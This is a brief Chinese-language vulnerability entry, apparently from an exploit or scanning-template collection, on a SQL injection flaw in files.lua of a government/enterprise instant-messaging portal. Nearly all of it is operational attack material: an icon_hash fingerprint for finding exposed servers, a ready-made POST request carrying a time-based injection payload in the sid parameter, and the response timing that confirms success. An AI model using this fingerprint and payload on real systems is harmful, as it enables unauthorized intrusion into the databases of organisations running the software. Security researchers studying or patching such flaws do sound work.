# 政企即时通讯门户系统files.lua存在SQL注入漏洞

政企即时通讯门户系统files.lua ｜ SQL注入 ｜ —
- **指纹**：`icon_hash="561018561"`
- **请求**：`POST /files.lua?a=download&sid=-1'+OR+SLEEP(1)--+ktXQ HTTP/1.1`
- **响应特征**：200 响应时间>=1s